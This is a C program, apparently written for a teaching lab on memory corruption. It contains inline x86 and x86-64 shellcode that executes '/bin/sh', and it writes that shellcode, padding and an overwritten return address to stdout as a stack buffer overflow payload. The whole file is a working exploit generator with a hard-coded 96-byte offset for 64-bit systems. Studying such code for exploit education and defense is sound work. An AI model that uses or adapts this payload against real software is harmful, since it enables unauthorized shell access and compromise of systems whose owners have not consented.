#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#ifndef __x86_64
asm(".globl shellcode");
asm("shellcode:");
asm("        pushl $0x0068732f");  // "/sh\0"
asm("        pushl $0x6e69622f");  // "/bin"

asm("        movl  %esp, %ebx");  // %ebx <- <pointer to /bin/sh>

asm("        xorl %ecx, %ecx");  // %ecx <- 0
asm("        pushl %ecx");
asm("        pushl %ebx");
asm("        movl  %esp, %ecx");  // %ecx <- <pointer to argv>

asm("        xorl %edx, %edx");  // %edx <- NULL <envp>
asm("        movl $0x0b, %eax");  // %eax <- 0x0b (__NR_execve)

asm("        int $0x80");  // Do the syscall

asm(".globl shellcode_end");
asm("shellcode_end:");
asm("        nop");
#else
asm(".globl shellcode");
asm("shellcode:");
asm("        movq $0x0068732f6e69622f, %rdi");  // Push "/bin/sh\0" onto the stack
asm("        pushq %rdi");

asm("        movq  %rsp, %rdi");  // %rdi <- <pointer to /bin/sh>

asm("        xorq %rdx, %rdx");  // %rdx <- 0 <envp>
asm("        pushq %rdx");
asm("        pushq %rdi");
asm("        movq  %rsp, %rsi");  // %rsi <- <pointer to argv>: ["/bin/sh", NULL]

asm("        movq $0x3b, %rax");  // %rax <- 0x3b (__NR_execve)

asm("        syscall");  // Do the syscall

asm(".globl shellcode_end");
asm("shellcode_end:");
asm("        nop");
#endif

extern void shellcode();
extern void shellcode_end();

int main(int argc, const char* argv[]) {
    if (argc != 3) {
        fprintf(stderr, "hack <&buffer in hex> <diff in decimal>\n");
        return 1;
    }

    uintptr_t offset = (uintptr_t) strtoll(argv[1], NULL, 16);
    int diff = strtoll(argv[2], NULL, 10);

#ifdef __x86_64
    // On X86-64, the diff is not useful (it probably is negative!) because
    // function arguments are passed on registers
    // Instead, we hard code the offset, which may vary from system to system
    diff = 96; // buffer size + sfp + ra = 80 + 8 + 8 = 96
#endif

    // Write out the shellcode, filler, the address, then \n
    int shellcode_length = &shellcode_end - &shellcode;
    ssize_t v = write(1, &shellcode, shellcode_length);

    // Fill the rest of the buffer and the frame pointer with NULL
    for (int i = shellcode_length; i < diff - (int) sizeof(uintptr_t); ++i)
        v = write(1, "", 1);

    // replace the return address with the buffer address
    v = write(1, &offset, sizeof(offset));
    v = write(1, "\n", 1);

    return 0;
}
